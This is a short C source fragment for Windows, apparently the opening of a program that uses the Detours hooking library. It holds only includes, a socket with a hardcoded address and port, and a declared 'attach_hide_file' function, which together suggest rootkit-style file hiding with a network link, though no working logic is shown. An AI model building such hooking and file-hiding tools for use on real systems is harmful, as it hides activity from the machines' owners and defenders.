#include <winsock2.h>
#include <winsock.h>
#include <stdio.h>
#include <windows.h>
#include <detours.h>

#define MAXLEN 512

SOCKET connect_socket;
static const char ip_address[] = "169.254.198.104";
static const int port = 9000;

CHAR name[MAXLEN];
wchar_t w_name[MAXLEN];
int attach_hide_file();

#pragma warning(disable  : 4996);
#pragma comment(lib, "Ws2_32.lib")